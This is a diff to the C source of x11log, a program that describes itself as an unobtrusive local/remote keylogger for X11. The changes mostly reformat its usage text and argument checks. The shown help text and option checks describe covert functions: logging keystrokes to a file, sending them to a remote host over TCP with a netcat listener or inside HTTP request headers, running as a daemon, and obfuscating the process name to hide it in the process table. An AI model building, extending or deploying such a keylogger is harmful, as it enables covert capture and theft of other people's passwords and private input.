@@ -4,9 +4,9 @@
  *
  * This code is licensed under GPLv3.
  * (c) Erik Sonnleitner 2007/2011, es@delta-xi.net
- * www.delta-xi.net
+ * www.delta-xi.net, launchpad.net/x11log
  *
- * Known Bugs/TODOs:
+ * TODOs:
  *   - fatal() doesn't yet free heap memory (logfile, hostname, etc)
  *   - process_name in obfuscation mode shouldn't be statically defined
  *   - keys which are pressed for a longer period of time, they are not
@@ -14,6 +14,10 @@
  *     speed of X keyboard settings); although this is not (yet) implemented,
  *     it won't have much impact on "regular" logs.
  *   - HTTP loggin: support POST requests
+ *   - Manpage would be cool
+ *
+ * Concerning Bugs, please refer to the offial project-page on Launchpad!
+ * http://launchpad.net/x11log
  * */
 
 #include <stdio.h>
@@ -30,7 +34,7 @@
 #include <netinet/in.h>  /* inet datatypes */
 #include <netdb.h>
 #include <errno.h>
-#include <stdarg.h>      /* variable argument list */
+#include <stdarg.h>      /* variable argument list for printf wrapper */
 
 #include <X11/Xlib.h>
 #include <X11/X.h>
@@ -167,19 +171,23 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			break;
 		  //case 'h':
 		  case '?':
-			log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
+			log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n");
+			log(0, stderr, " (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
 			log(0, stderr, " Usage: %s [OPTIONS]\n", argv[0]);
 			log(0, stderr, " Available options:\n");
-			log(0, stderr, "\t-s <DISPLAY>    X-Display to use, default is :0.0\n");
-			log(0, stderr, "\t-f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
-			log(0, stderr, "\t-r <HOST:PORT>  Log keystrokes to remote host. The other end needs a program listening on specified\n\t\t\tTCP port (e.g. using BSD netcat: 'nc -p <port> -k')\n");
-#ifdef _HAVE_CURL
-			log(0, stderr, "\t-h <HOST>       Log keystrokes to http server, in header of HTTP requests.\n");
-#endif
-			log(0, stderr, "\t-d              Daemonize (requires -f or -r or both).\n");
-			log(0, stderr, "\t-q              Be quiet (no output to console).\n");
-			log(0, stderr, "\t-o              Obfuscate process name in process table.\n");
-			log(0, stderr, "\t-?              Print usage.\n");
+			log(0, stderr, "   -s <DISPLAY>    X-Display to use, default is :0.0\n");
+			log(0, stderr, "   -f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is\n");
+			log(0, stderr, "                   appended, logfile created if it does not exist.\n");
+			log(0, stderr, "   -r <HOST:PORT>  Log keystrokes to remote host. The other end needs a\n");
+			log(0, stderr, "                   program listening on the specified TCP port (e.g. using\n");
+			log(0, stderr, "                   BSD netcat: 'nc -p <port> -k')\n");
+#		   ifdef _HAVE_CURL
+			log(0, stderr, "   -h <HOST>       Log keystrokes to webserver within HTTP requests headers.\n");
+#		   endif
+			log(0, stderr, "   -d              Daemonize (requires -f or -r or both).\n");
+			log(0, stderr, "   -q              Be quiet (no output to console).\n");
+			log(0, stderr, "   -o              Obfuscate process name in process table.\n");
+			log(0, stderr, "   -?              Print usage.\n");
 
 			exit(EXIT_FAILURE);
 		  default:
@@ -188,9 +196,11 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	}
 
 	/* logical constraints */
-	if(config->silent && !(config->log_remote_inet || config->log_remote_http || config->logfile))
+	if(config->silent &&
+	  !(config->log_remote_inet || config->log_remote_http || config->logfile))
 		fatal("Argument -q requires either logging to file or remote host (-r|-h|-f)");
-	if(config->daemonize && !(config->log_remote_inet || config->log_remote_http || config->logfile))
+	if(config->daemonize &&
+	  !(config->log_remote_inet || config->log_remote_http || config->logfile))
 		fatal("Argument -d requires either logging to file or remote host (-r|-h|-f)");
 	if(config->obfuscate && !config->daemonize)
 		fatal("Argument -o requires daemonization (-d)");
